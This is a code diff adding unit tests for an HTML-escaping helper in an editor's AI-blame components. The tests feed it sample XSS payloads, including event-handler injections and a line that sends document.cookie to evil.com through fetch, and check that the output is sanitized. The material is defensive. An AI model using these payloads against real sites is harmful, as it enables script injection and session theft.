@@ -6,6 +6,7 @@ import type { ProvenanceEntry } from '../../db';
 import { 
   formatTimestamp, 
   formatTestStatus, 
+  escapeHtml,
   AiBlameSidePanel,
   createAiBlameHoverTooltip,
   createAiBlameCursorListener
@@ -135,5 +136,34 @@ describe('EditorAiBlame Components & Utilities', () => {
     const onLineChange = vi.fn();
     const cursorExt = createAiBlameCursorListener(onLineChange, getBlame);
     expect(cursorExt).toBeDefined();
+  });
+
+  describe('escapeHtml security utility', () => {
+    it('escapes &, <, >, ", and \' characters correctly', () => {
+      const malicious = `<script>alert("XSS & 'pwned'")</script>`;
+      const escaped = escapeHtml(malicious);
+      expect(escaped).toBe('&lt;script&gt;alert(&quot;XSS &amp; &#039;pwned&#039;&quot;)&lt;/script&gt;');
+      expect(escaped).not.toContain('<');
+      expect(escaped).not.toContain('>');
+      expect(escaped).not.toContain('"');
+      expect(escaped).not.toContain("'");
+    });
+
+    it('handles benign text without altering non-HTML characters', () => {
+      const plain = 'gemini-1.5-pro (google) / src/App.tsx line 42';
+      expect(escapeHtml(plain)).toBe(plain);
+    });
+
+    it('safely escapes adversarial provenance metadata values', () => {
+      const payloadModel = `<img src=x onerror=alert(1)>`;
+      const payloadProvider = `"><svg onload=alert(document.cookie)>`;
+      const payloadRationale = `AI update"; fetch('https://evil.com?c=' + document.cookie); "`;
+      const payloadDetails = `<b onmouseover=alert(1)>failed test</b>`;
+
+      expect(escapeHtml(payloadModel)).not.toContain('<img');
+      expect(escapeHtml(payloadProvider)).not.toContain('">');
+      expect(escapeHtml(payloadRationale)).not.toContain('"');
+      expect(escapeHtml(payloadDetails)).not.toContain('<b');
+    });
   });
 });
